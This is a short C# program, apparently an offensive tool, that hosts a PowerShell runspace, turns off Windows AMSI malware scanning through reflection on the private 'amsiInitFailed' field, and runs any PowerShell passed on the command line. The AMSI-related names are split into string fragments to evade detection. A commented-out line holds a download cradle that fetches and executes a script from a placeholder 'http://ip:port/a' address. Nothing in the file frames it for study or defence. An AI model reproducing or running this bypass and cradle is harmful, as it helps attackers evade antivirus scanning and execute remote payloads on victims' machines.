using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Text;

namespace TestExe
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace mySpace = RunspaceFactory.CreateRunspace();
            mySpace.Open();
            Pipeline myPipeLine = mySpace.CreatePipeline();
            mySpace.GetType().Assembly.GetType("Syste" + "m.Managem" + "ent.Autom" + "ation.AmsiU" + "tils").GetField("am" + "siInitF" + "ailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
            Console.WriteLine(args[0].Replace("+", " "));
            myPipeLine.Commands.AddScript(args[0].Replace("+"," "));
            //myPipeLine.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))");
            Collection<PSObject> outputs = myPipeLine.Invoke();
            mySpace.Close();

            System.Text.StringBuilder sb = new StringBuilder();

            foreach (PSObject pobject in outputs)
            {

                sb.AppendLine(pobject.ToString());

            }
            Console.WriteLine(sb.ToString());
        }
    }
}
